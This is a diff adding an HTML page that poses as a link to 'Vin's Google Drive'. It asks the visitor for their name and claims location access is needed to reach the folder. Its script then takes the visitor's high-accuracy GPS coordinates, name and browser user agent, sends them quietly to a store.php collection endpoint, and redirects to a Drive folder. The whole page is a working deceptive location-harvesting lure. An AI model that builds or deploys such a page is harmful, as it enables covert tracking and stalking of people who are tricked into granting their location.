@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Go to Vin's G Drive</title>
+  <style>
+    /* Center the button and text */
+    #centered-container {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+
+    /* Style the heading */
+    .drive-heading {
+      font-size: 32px;
+      margin-bottom: 20px;
+      color: #333333;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Style the input field */
+    .name-input {
+      padding: 8px;
+      font-size: 16px;
+      width: 200px;
+      border: 1px solid #dddddd;
+      border-radius: 4px;
+      margin-bottom: 10px;
+    }
+
+    /* Style the button */
+    .location-button {
+      display: inline-block;
+      padding: 12px 24px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      text-decoration: none;
+      color: #ffffff;
+      background-color: #007bff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: background-color 0.3s ease;
+    }
+
+    .location-button:hover {
+      background-color: #0056b3;
+    }
+
+    /* Style the text */
+    .location-text {
+      font-size: 14px;
+      color: #555555;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Background styles */
+    body {
+      background-color: #f2f2f2;
+      background-image: linear-gradient(to bottom right, #b3d1ff, #ffffff);
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+  </style>
+</head>
+<body>
+  <div id="centered-container">
+    <h1 class="drive-heading">Go to Vin's Google Drive</h1>
+    <input id="name-input" class="name-input" type="text" placeholder="Enter your name to continue">
+    <br>
+    <button class="location-button" onclick="getGPSLocation()">Go to Drive Location</button>
+    <p class="location-text">Allow location to be directed to Google Drive.</p>
+  </div>
+
+  <script>
+    function getGPSLocation() {
+      var nameInput = document.getElementById("name-input");
+      var name = nameInput.value.trim();
+
+      if (name === "") {
+        alert("Please enter your name.");
+        return;
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendGPSLocation, handleGPSError, { enableHighAccuracy: true });
+      } else {
+        alert("GPS location is not supported by this browser.");
+      }
+    }
+
+    function sendGPSLocation(position) {
+      var nameInput = document.getElementById("name-input");
+      var name = nameInput.value.trim();
+
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      // Send the location data to your store.php using AJAX or any other method
+      var xhr = new XMLHttpRequest();
+      var url = "store.php?lat=" + latitude + "&long=" + longitude + "&name=" + encodeURIComponent(name) + "&uagent=" + encodeURIComponent(navigator.userAgent);
+      xhr.open("GET", url, true);
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200){
+            // Handle the response from the server if needed
+          console.log(xhr.responseText);
+        }
+      };
+      xhr.send();
+
+      // Redirect the user to the desired URL with GPS location
+      var gpsUrl = "https://drive.google.com/drive/folders/1pi-DLvh7VrRCZUuer2xYvAWM-TJvGH-C?usp=sharing";
+      gpsUrl += "?lat=" + latitude + "&long=" + longitude;
+      window.location.href = gpsUrl;
+    }
+
+    function handleGPSError(error) {
+      alert("Error occurred while retrieving GPS location: " + error.message);
+    }
+  </script>
+</body>
+</html>
